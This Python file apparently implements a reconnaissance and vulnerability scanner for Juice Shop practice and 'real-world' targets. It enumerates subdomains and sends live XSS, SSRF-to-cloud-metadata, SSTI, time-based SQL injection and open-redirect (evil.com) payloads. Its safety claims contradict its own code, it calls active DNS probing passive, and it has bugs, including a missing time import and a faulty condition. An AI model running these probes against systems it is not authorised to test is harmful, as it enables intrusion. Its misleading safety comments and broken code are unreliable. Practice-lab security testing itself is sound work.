import logging
from enum import Enum
from typing import List, Dict, Any
import requests
import socket
import urllib3
from datetime import datetime

# Disable insecure request warnings for local practice targets
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

class AllowedBugClasses(Enum):
    IDOR = "idor"
    XSS = "xss"
    INFO_DISCLOSURE = "info_disclosure"
    SSRF = "ssrf"
    SSTI = "ssti"
    SQLI_BLIND = "sqli_blind"  # Time-based, safe for real-world
    OPEN_REDIRECT = "open_redirect"

class ReconPipeline:
    """
    Enforces safe reconnaissance.
    Strictly rate limits active tools and restricts vulnerability payloads
    exclusively to beginner-safe low-risk bug classes: IDOR, XSS, and Info-Disclosure.
    This version implements REAL HTTP probes instead of simulated sleep.
    """

    def __init__(self):
        self.allowed_classes = {c.value for c in AllowedBugClasses}

    # Common entry-point subdomains to probe on real targets
    REAL_WORLD_SUBDOMAINS = ["api", "app", "dev", "staging", "www", "admin", "m", "internal"]

    def passive_recon(self, domain: str) -> List[str]:
        """Performs actual DNS resolution + common subdomain discovery."""
        logger.info(f"Running passive DNS resolution on {domain}")
        found_subdomains = []
        try:
            # Clean domain string (remove http:// or https:// if present)
            clean_domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
            if ":" in clean_domain:
                clean_domain = clean_domain.split(":")[0]

            # Always include the root domain first
            ip = socket.gethostbyname(clean_domain)
            logger.info(f"Resolved {clean_domain} to {ip}")
            found_subdomains.append(f"https://{clean_domain}")

            # God-Mode: Enumerate common subdomains via DNS resolution
            for sub in self.REAL_WORLD_SUBDOMAINS:
                candidate = f"{sub}.{clean_domain}"
                try:
                    sub_ip = socket.gethostbyname(candidate)
                    logger.info(f"Found live subdomain: {candidate} -> {sub_ip}")
                    found_subdomains.append(f"https://{candidate}")
                except socket.gaierror:
                    pass  # Subdomain doesn't exist, skip silently

        except socket.gaierror:
            logger.warning(f"Failed to resolve base domain: {domain}")
            
        return found_subdomains

    def filter_payloads(self, proposed_tests: List[str]) -> List[str]:
        """ Filters out dangerous payloads. """
        safe_tests = []
        for test in proposed_tests:
            if test in self.allowed_classes:
                safe_tests.append(test)
            else:
                logger.warning(f"BLOCKED payload: {test} is not permitted for automated testing.")
        return safe_tests

    def active_scan(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Performs REAL, verifiable HTTP requests against the target to find low-hanging fruit.
        Specifically tailored to find Juice Shop practice vulnerabilities (or similar real-world configs).
        """
        findings = []
        logger.info(f"Initiating active scan on {target_url} for low-risk vulnerabilities...")
        
        # Ensure we have a schema
        if not target_url.startswith("http"):
            target_url = "http://" + target_url

        # Probe 1: Exposed FTP Directory (Info Disclosure)
        ftp_url = f"{target_url}/ftp"
        try:
            logger.info(f"Probing: {ftp_url}")
            resp = requests.get(ftp_url, verify=False, timeout=5)
            if resp.status_code == 200 and "Index of /ftp" in resp.text or "quarantine" in resp.text:
                findings.append({
                    "bug_class": "info_disclosure",
                    "severity": "Medium",
                    "evidence": "Exposed /ftp directory found containing sensitive backup/config files.",
                    "poc_log": f"GET {ftp_url} HTTP/1.1\n\nHTTP/1.1 {resp.status_code} OK\n\n{resp.text[:200]}..."
                })
        except requests.RequestException as e:
            logger.debug(f"/ftp probe failed: {e}")

        # Probe 2: BOLA/IDOR on Users API Endpoint (Juice Shop specific, but common in wild)
        users_url = f"{target_url}/api/Users"
        try:
            logger.info(f"Probing: {users_url}")
            resp = requests.get(users_url, verify=False, timeout=5)
            if resp.status_code == 200 and "data" in resp.json() and len(resp.json()["data"]) > 0:
                findings.append({
                    "bug_class": "idor",
                    "severity": "High",
                    "evidence": "Unauthenticated access to /api/Users endpoint disclosing PII (emails/passwords hashes).",
                    "poc_log": f"GET {users_url} HTTP/1.1\n\nHTTP/1.1 {resp.status_code} OK\n\n{resp.text[:200]}..."
                })
        except (requests.RequestException, ValueError) as e:
            logger.debug(f"/api/Users probe failed: {e}")
            
        # Probe 3: Reflective XSS Probe on Search (Juice Shop common)
        search_url = f"{target_url}/rest/products/search?q=<script>alert('VULNERABLE')</script>"
        try:
            logger.info(f"Probing: {search_url}")
            resp = requests.get(search_url, verify=False, timeout=5)
            # Juice shop returns the exact query string unescaped in an error/success message
            if "<script>alert('VULNERABLE')</script>" in resp.text:
                 findings.append({
                    "bug_class": "xss",
                    "severity": "High",
                    "evidence": "Reflected Cross-Site Scripting (XSS) detected in the 'q' parameter of the search API.",
                    "poc_log": f"GET {search_url} HTTP/1.1\n\nHTTP/1.1 {resp.status_code} OK\n\n{resp.text[:200]}..."
                })
        except requests.RequestException as e:
            logger.debug(f"Search XSS probe failed: {e}")

        # Probe 4: SSRF on profile image fetch
        ssrf_url = f"{target_url}/profile/image?url=http://169.254.169.254/latest/meta-data/"
        try:
            logger.info(f"Probing: {ssrf_url}")
            resp = requests.get(ssrf_url, verify=False, timeout=5)
            if resp.status_code == 200 and ("ami-id" in resp.text or "instance-id" in resp.text):
                findings.append({
                    "bug_class": "ssrf",
                    "severity": "Critical",
                    "evidence": "SSRF vulnerability detected via AWS metadata endpoint exposure on profile image fetch.",
                    "poc_log": f"GET {ssrf_url} HTTP/1.1\n\nHTTP/1.1 {resp.status_code} OK\n\n{resp.text[:200]}..."
                })
        except requests.RequestException as e:
            logger.debug(f"SSRF probe failed: {e}")

        # Probe 5: SSTI on template renderer
        ssti_url = f"{target_url}/render?template={{{{7*7}}}}"
        try:
            logger.info(f"Probing: {ssti_url}")
            resp = requests.get(ssti_url, verify=False, timeout=5)
            if resp.status_code == 200 and "49" in resp.text:
                findings.append({
                    "bug_class": "ssti",
                    "severity": "Critical",
                    "evidence": "Server-Side Template Injection (SSTI) detected. Template evaluated {{7*7}} as 49.",
                    "poc_log": f"GET {ssti_url} HTTP/1.1\n\nHTTP/1.1 {resp.status_code} OK\n\n{resp.text[:200]}..."
                })
        except requests.RequestException as e:
            logger.debug(f"SSTI probe failed: {e}")

        # Probe 6: Time-Based Blind SQL Injection (safe, non-destructive)
        sqli_url = f"{target_url}/rest/user/login"
        sqli_payload = {"email": "admin' AND SLEEP(3)--", "password": "test"}
        try:
            logger.info(f"Probing: {sqli_url} for Blind SQLi (time-based)")
            start_time = time.time()
            resp = requests.post(sqli_url, json=sqli_payload, verify=False, timeout=10)
            elapsed = time.time() - start_time
            # If server took >2.5 seconds to respond to a login attempt, time-based SQLi likely exists
            if elapsed >= 2.5 and resp.status_code in [200, 401, 403, 500]:
                findings.append({
                    "bug_class": "sqli_blind",
                    "severity": "Critical",
                    "evidence": f"Possible Time-Based Blind SQLi: Login endpoint delayed {elapsed:.1f}s with SLEEP(3) payload.",
                    "poc_log": f"POST {sqli_url} body={sqli_payload}\nResponse time: {elapsed:.1f}s (expected ~0s)"
                })
        except requests.RequestException as e:
            logger.debug(f"Blind SQLi probe failed: {e}")

        # Probe 7: Open Redirect via common 'next' or 'redirect' parameters
        for redirect_param in ["redirect", "next", "return", "url", "goto"]:
            redirect_url = f"{target_url}/?{redirect_param}=https://evil.com"
            try:
                logger.info(f"Probing: {redirect_url} for Open Redirect")
                resp = requests.get(redirect_url, verify=False, timeout=5, allow_redirects=False)
                # Check if server issues a 301/302 pointing to our injected URL
                location = resp.headers.get("Location", "")
                if resp.status_code in [301, 302] and "evil.com" in location:
                    findings.append({
                        "bug_class": "open_redirect",
                        "severity": "Medium",
                        "evidence": f"Open Redirect via '?{redirect_param}=' parameter. Server redirected to: {location}",
                        "poc_log": f"GET {redirect_url}\nHTTP/1.1 {resp.status_code}\nLocation: {location}"
                    })
                    break  # Found one, no need to check other params
            except requests.RequestException as e:
                logger.debug(f"Open Redirect probe failed for param '{redirect_param}': {e}")

        logger.info(f"Active scan complete. Found {len(findings)} issues.")
        return findings

if __name__ == "__main__":
    pipeline = ReconPipeline()
    tests = ["sqli", "idor", "xss", "rce", "dos"]
    safe = pipeline.filter_payloads(tests)
    print(f"Executing payload classes: {safe}")
    
    # Simple self-test against a public target (passive only)
    print(pipeline.passive_recon("google.com"))
